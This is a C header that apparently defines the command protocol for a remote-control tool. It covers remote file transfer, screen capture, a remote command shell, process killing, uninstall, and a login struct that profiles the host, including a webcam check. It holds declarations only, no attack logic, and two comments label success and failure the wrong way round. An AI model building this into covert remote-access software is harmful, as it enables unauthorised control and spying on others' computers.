#pragma  once

#include <windows.h>

//IOCP消息码
#define	NC_CLIENT_CONNECT		0x0001
#define	NC_CLIENT_DISCONNECT	0x0002
#define	NC_TRANSMIT				0x0003
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // 完整接收
//包长度限制
#define  MAX_RECVBUF_SIZE   1024*20
#define  MAX_SENDBUF_SIZE   1024*20
#define  timeout            20      //心跳检测间隔 30秒

enum
{
    //服务端命令
    COMMAND_DIR = 0X00,
    COMMAND_FILE_OPEN,
    COMMAND_FILE_BEGIN,
    COMMAND_OPEN_FILEDLG,               //打开文件对话框
    COMMAND_PANFU,                      //盘符消息码
    COMMAND_FILE_DIR,                   //打开文件目录
    COMMAND_FILE_Size,                  //文件大小
    COMMAND_FILE_Data,                  //接受文件
    COMMAND_FILE_Down,                  //文件下载
    COMMAND_CONTINUE,                   //两边收文件用
    COMMAND_FILE_END,                   //文件传输完毕
    COMMAND_FILE_TRANSFMODE,            //传输模式
    COMMAND_FILE_TRANSFMODE_CANCEL,     //取消
    COMMAND_FILE_TRANSFMODE_COVER,      //覆盖
    COMMAND_FILE_TRANSFMODE_CONTINUE,   //续传

    COMMAND_Screen,
    COMMAND_Screen_OPEN,
    COMMAND_Screen_BEGIN,               //发结构体
    COMMAND_Screen_DATA,                //发送数据

    COMMAND_CMD,
    COMMAND_CMD_OPEN,
    COMMAND_CMD_BEGIN,
    COMMAND_CMD_DATA,

    COMMAND_PROCESS,                //服务端请求进程信息
    COMMAND_PROCESS_OPEN,           //客户端发送打开进程窗口
    COMMAND_PROCESS_BEGIN,          //服务端窗口打开可以开始传送数据
    COMMAND_PROCESS_DATA,           //传送数据到服务端
    COMMAND_PROCESS_KILL,           //结束进程
    COMMAND_PROCESS_KILL_Success,   //结束进程失败
    COMMAND_PROCESS_KILL_Fail,      //结束进程成功

    //客户端命令
    COMMAND_LOGIN,

    //共用
    COMMAND_HEARTBEAT,                //心跳
    TOKEN_LOGIN,                     //登录
    COMMAND_Stop                     //卸载
};

typedef struct
{
    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
}FILESIZE;


struct tagPacketHead
{
    DWORD m_dwSize;     //表示包的长度
    DWORD m_dwUnSize;   //解压后的大小
};

typedef struct
{
    BYTE			bToken;			// = 1
    char	        szOSver[16];	// 版本信息
    int				CPUClockMhz;	// CPU主频
    char			szIP[16];		// 存储32位的IPv4的地址数据结构
    char			HostName[50];	// 主机名
    bool			bIsWebCam;		// 是否有摄像头
    DWORD			dwSpeed;		// 网速
}LOGININFO;

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

void Dbgprintf(char *pszFormat, ...);
bool RecvData(SOCKET s, char* pBuf, int nSize);
bool SendData(SOCKET s, char* pBuf, int nSize);
bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);